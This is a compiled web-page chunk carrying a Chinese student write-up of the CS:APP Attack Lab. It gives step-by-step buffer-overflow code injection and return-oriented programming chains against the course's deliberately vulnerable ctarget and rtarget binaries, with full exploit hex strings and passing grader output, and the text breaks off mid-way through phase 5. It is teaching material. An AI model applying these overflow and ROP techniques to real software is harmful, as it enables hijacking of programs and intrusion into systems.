(window.webpackJsonp=window.webpackJsonp||[]).push([[34],{434:function(t,s,a){"use strict";a.r(s);var e=a(11),n=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"实验描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#实验描述"}},[t._v("#")]),t._v(" 实验描述")]),t._v(" "),a("p",[t._v("本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在 getbuf 函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。")]),t._v(" "),a("h1",{attrs:{id:"第一阶段"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#第一阶段"}},[t._v("#")]),t._v(" 第一阶段")]),t._v(" "),a("p",[t._v("第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。")]),t._v(" "),a("p",[t._v("那么我们将需要执行的操作码和地址输入机器码即可。")]),t._v(" "),a("h2",{attrs:{id:"phase-1"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phase-1"}},[t._v("#")]),t._v(" phase_1")]),t._v(" "),a("p",[t._v("第一关非常简单，题目主要我们在 getbuf 执行完成后执行 touch1,touch1()无参。")]),t._v(" "),a("div",{staticClass:"language-assembly extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("(gdb) disas getbuf\nDump of assembler code for function getbuf:\n   0x0000000000401688 <+0>:\tsub    $0x18,%rsp\n   0x000000000040168c <+4>:\tmov    %rsp,%rdi\n   0x000000000040168f <+7>:\tcallq  0x4018ca <Gets>\n   0x0000000000401694 <+12>:\tmov    $0x1,%eax\n   0x0000000000401699 <+17>:\tadd    $0x18,%rsp\n   0x000000000040169d <+21>:\tretq\nEnd of assembler dump.\n(gdb) disas touch1\nDump of assembler code for function touch1:\n   0x00000000004016a0 <+0>:\tsub    $0x8,%rsp\n   0x00000000004016a4 <+4>:\tmovl   $0x1,0x2029ee(%rip)        # 0x60409c <vlevel>\n   0x00000000004016ae <+14>:\tmov    $0x402e4e,%edi\n   0x00000000004016b3 <+19>:\tcallq  0x400bd0 <puts@plt>\n   0x00000000004016b8 <+24>:\tmov    $0x1,%edi\n   0x00000000004016bd <+29>:\tcallq  0x401ab5 <validate>\n   0x00000000004016c2 <+34>:\tmov    $0x0,%edi\n   0x00000000004016c7 <+39>:\tcallq  0x400d60 <exit@plt>\nEnd of assembler dump.\n")])])]),a("p",[t._v("可以看到，getbuf 开出了 0x18，即 24 字节的空间，touch1 的地址为 0x4016a0。那么我们只需填满这 0x28 空间，再以 touch1 地址替代返回值。注意：x86-64 机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\na0 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\n")])])]),a("p",[t._v("转换后输入即可")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("Cookie: 0x63149380\nType string:Touch1"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v(": You called touch1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nValid solution "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" level "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v(" with target ctarget\nPASS: Would have posted the following:\n\tuser "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("id")]),t._v("\t"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2017211523")]),t._v("\n\tcourse\tf18\n\tlab\tattacklab\n\tresult\t"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("117")]),t._v(":PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\n")])])]),a("h2",{attrs:{id:"phase-2"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phase-2"}},[t._v("#")]),t._v(" phase_2")]),t._v(" "),a("p",[t._v("第二关根据题意，需要调用 touch2，需要传递一个无符号整数值，其值为 cookie，查看 cookie 文件，如下。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2017211523")]),t._v("@bupt3:~/target117$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" cookie.txt\n0x63149380\n")])])]),a("p",[t._v("为了给 touch2 传参，我们需要将 cookie 值赋给%rdi，然后将 touch2 地址压栈，使用 ret 弹出 touch2 地址返回，调用 touch2。")]),t._v(" "),a("div",{staticClass:"language-assembly extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("mov     $0x63149380,%rdi\npushq   $0x4016cc\nret\n")])])]),a("p",[t._v("将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。")]),t._v(" "),a("div",{staticClass:"language-assembly extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("phase2.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 <.text>:\n   0:   48 c7 c7 80 93 14 63    mov    $0x63149380,%rdi\n   7:   68 cc 16 40 00          pushq  $0x4016cc\n   c:   c3                      retq\n")])])]),a("p",[t._v("我们将指令的机器码放在 getbuf 时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用 getbuf 时栈顶地址为 0x5566f7a8。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[t._v("48")]),t._v(" c7 c7 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("93")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("14")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("63")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v("\ncc "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 c3 00 00 00\n00 00 00 00 00 00 00 00\na8 f7 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("66")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("55")]),t._v(" 00 00 00 00\n")])])]),a("p",[t._v("输入运行。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2017211523")]),t._v("@bupt3:~/target117$ ./hex2raw "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" phase2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./ctarget -q\nCookie: 0x63149380\nType string:Touch2"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v(": You called touch2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0x63149380"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nValid solution "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" level "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(" with target ctarget\nPASS: Would have posted the following:\n\tuser "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("id")]),t._v("\t"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2017211523")]),t._v("\n\tcourse\tf18\n\tlab\tattacklab\n\tresult\t"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("117")]),t._v(":PASS:0xffffffff:ctarget:2:48 C7 C7 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("93")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("14")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("63")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" CC "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("66")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("55")]),t._v(" 00 00 00 00\n")])])]),a("h2",{attrs:{id:"phase-3"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phase-3"}},[t._v("#")]),t._v(" phase_3")]),t._v(" "),a("p",[t._v("查看 touch3")]),t._v(" "),a("div",{staticClass:"language-cpp extra-class"},[a("pre",{pre:!0,attrs:{class:"language-cpp"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("void")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("touch3")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("sval"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\tvlevel "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/* Part of validation protocol */")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("hexmatch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" sval"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Touch3!: You called touch3(\\"%s\\")\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" sval"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("validate")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Misfire: You called touch3(\\"%s\\")\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" sval"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("fail")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("exit")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("可知其需要一个指向字符的指针 sval，然后调用 hexmatch，将 cookie 和 sval 作为参数传入，需要 hexomatch 返回非零值。")]),t._v(" "),a("div",{staticClass:"language-cpp extra-class"},[a("pre",{pre:!0,attrs:{class:"language-cpp"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("hexmatch")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("unsigned")]),t._v(" val"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("sval"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" cbuf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("110")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/* Make position of check string unpredictable */")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("s "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" cbuf "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("random")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("100")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sprintf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"%.8x"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" val"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("strncmp")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sval"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("9")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),a("p",[t._v("由 hexmatch 可知，其比较 cookie 的字符串表示与传入的字符串是否相等，相等则返回 1，那么问题明了，我们需要将表示 cookie 的字符串地址传给 touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用 hexmatch 时候未被重写改变的空间，借以保存字符串。")]),t._v(" "),a("div",{staticClass:"language-assembly extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("mov     $0x5566f7c8,%rdi\npushq   $0x4017a0\nret\n")])])]),a("p",[t._v("这里我们将 cookie 的字符串表示放在 0x5566f7c8，编译再反汇编得到机器码")]),t._v(" "),a("div",{staticClass:"language-assembly extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("phase3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 <.text>:\n   0:   48 c7 c7 c8 f7 66 55    mov    $0x5566f7c8,%rdi\n   7:   68 a0 17 40 00          pushq  $0x4017a0\n   c:   c3                      retq\n")])])]),a("p",[t._v("查表得出 cookie 字符串的 16 进制表示为 36 33 31 34 39 33 38 30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\\0’，得到攻击字符串如下")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[t._v("48")]),t._v(" c7 c7 c8 f7 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("66")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("55")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v("\na0 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("17")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 c3 00 00 00\n00 00 00 00 00 00 00 00\na8 f7 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("66")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("55")]),t._v(" 00 00 00 00\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("36")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("33")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("31")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("34")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("39")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("33")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("38")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("30")]),t._v("\n00\n")])])]),a("p",[t._v("转换输入运行")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2017211523")]),t._v("@bupt3:~/target117$ ./hex2raw "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" phase3 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./ctarget -q\nCookie: 0x63149380\nType string:Touch3"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v(": You called touch3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"63149380"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nValid solution "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" level "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),t._v(" with target ctarget\nPASS: Would have posted the following:\n\tuser "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("id")]),t._v("\t"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2017211523")]),t._v("\n\tcourse\tf18\n\tlab\tattacklab\n\tresult\t"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("117")]),t._v(":PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("66")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("55")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("68")]),t._v(" A0 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("17")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("66")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("55")]),t._v(" 00 00 00 00 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("36")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("33")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("31")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("34")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("39")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("33")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("38")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("30")]),t._v(" 00\n")])])]),a("h1",{attrs:{id:"第二阶段"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#第二阶段"}},[t._v("#")]),t._v(" 第二阶段")]),t._v(" "),a("p",[t._v("在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施：")]),t._v(" "),a("p",[t._v("1.函数栈随机化 ，无法再获取绝对地址。")]),t._v(" "),a("p",[t._v("2.栈内存的内容被锁定为不可执行。")]),t._v(" "),a("p",[t._v("故此，我们需要使用 ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用 ret 指令返回完成所需操作。")]),t._v(" "),a("h2",{attrs:{id:"phase-4"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phase-4"}},[t._v("#")]),t._v(" phase_4")]),t._v(" "),a("p",[t._v("此关需用 ROP 方法完成 phase_2 内容。那么就需要在操作中得到 cookie 值，那么只有用 pop 指令了，需要指令为。")]),t._v(" "),a("div",{staticClass:"language-assembly extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("popq \t%rax\nmovq\t%rax,%rdi\nret\n")])])]),a("p",[t._v("查找官方的 write up，得知对应机器码，然后在在 rtarget 文件的反汇编文件中利用 vim 查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n3c "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\t/*\tpopq rax\t\t*/\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("93")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("14")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("63")]),t._v(" 00 00 00 00\t/*\tcookie\t\t\t*/\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("49")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\t/*\tmovq %rax,%rdi \t*/\ncc "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00 /*\ttouch2\t\t\t*/\n")])])]),a("p",[t._v("转换输入运行")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2017211523")]),t._v("@bupt3:~/target117$ ./hex2raw "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" phase4 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ./rtarget\nCookie: 0x63149380\nType string:Touch2"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v(": You called touch2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0x63149380"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nValid solution "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" level "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(" with target rtarget\nPASS: Sent exploit string to server to be validated.\nNICE "),a("span",{pre:!0,attrs:{class:"token environment constant"}},[t._v("JOB")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("\n")])])]),a("h2",{attrs:{id:"phase-5"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#phase-5"}},[t._v("#")]),t._v(" phase_5")]),t._v(" "),a("p",[t._v("此关为 phase_3 的 ROP 版本，我们需要查找 start_farm 到 end_farm 中的 gadgets，拼凑出代码实现 phase_3 中插入代码的功能。还需注意：")]),t._v(" "),a("p",[t._v("1.0x90 代表 nop，除了将 pc 加 1 之外不做任何事。")]),t._v(" "),a("p",[t._v("2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。")]),t._v(" "),a("p",[t._v("需要的指令有")]),t._v(" "),a("div",{staticClass:"language-assembly extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("movq\t%rsp,%rax\nmovq\t%rax,%rdi\npopq\t%rax\nmovl\t%eax,%ecx\nmovl\t%ecx,%edx\nmovl\t%edx,%esi\nlea(%rdi, %rsi, 1),%rax\nmovq\t%rax,%rdi\n")])])]),a("p",[t._v("则攻击字符串为")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\nbd "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\t/*\tgadget1\t\t\t*/\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("49")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\t/*\tgadget2\t\t\t*/\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("30")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\t/* \tgadget3\t\t\t*/\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("48")]),t._v(" 00 00 00 00 00 00 00\t/*\tcookie字符串偏移量*/\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("13")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\t/*\tgadget4\t\t\t*/\nca "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("40")]),t._v(" 00 00 00 00 00\t/*\tgadget5\t\t\t*/\nb7 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("18")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token 